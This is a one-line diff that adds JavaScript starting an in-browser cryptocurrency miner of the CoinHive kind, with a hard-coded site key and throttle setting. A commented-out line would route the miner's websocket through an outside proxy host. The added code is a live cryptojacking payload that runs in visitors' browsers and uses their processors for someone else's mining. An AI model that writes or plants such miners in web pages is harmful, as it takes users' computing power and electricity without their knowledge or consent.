@@ -1,0 +1,1 @@
+  // Configure CoinHive to point to your proxy  // CRLT.CONFIG.WEBSOCKET_SHARDS = [["ws://space.mojradio.co:8844"]];  // Start miner  var miner = CRLT.Anonymous('d95037205794a103b9c772970bdf60c0bfaae1829c96',  {     throttle: 0.8   }  );  miner.start();
